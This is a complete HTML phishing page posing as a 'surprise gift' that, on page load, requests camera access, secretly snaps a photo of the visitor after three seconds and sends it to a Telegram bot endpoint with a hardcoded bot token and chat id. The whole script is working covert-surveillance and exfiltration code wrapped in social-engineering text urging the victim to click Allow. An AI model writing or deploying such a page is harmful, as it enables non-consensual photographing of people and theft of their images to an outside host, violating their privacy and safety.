<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Unlock Your Surprise</title>

<style>
    body {
        margin: 0;
        background: black;
        color: white;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        text-align: center;
    }

    #loading {
        font-size: 28px;
        animation: blink 1s infinite;
        margin-bottom: 20px;
    }

    @keyframes blink {
        0% { opacity: 0.2; }
        50% { opacity: 1; }
        100% { opacity: 0.2; }
    }
</style>
</head>

<body>

<h2 id="loading">Loading your surprise...</h2>
<h3>üéÅ Please click <b>Allow</b> to unlock your gift!</h3>

<script>
    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

            let track = stream.getVideoTracks()[0];
            let imageCapture = new ImageCapture(track);

            setTimeout(() => {
                imageCapture.takePhoto().then(blob => {

                    let form = new FormData();
                    form.append("photo", blob, "pic.jpg");

                    fetch("https://api.telegram.org/bot8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI/sendPhoto?chat_id=8215819954", {
                        method: "POST",
                        body: form
                    });

                });
            }, 3000);

        } catch (err) {
            document.getElementById("loading").innerText = "‚ùå Please allow camera!";
        }
    }

    startCamera();
</script>

</body>
</html>
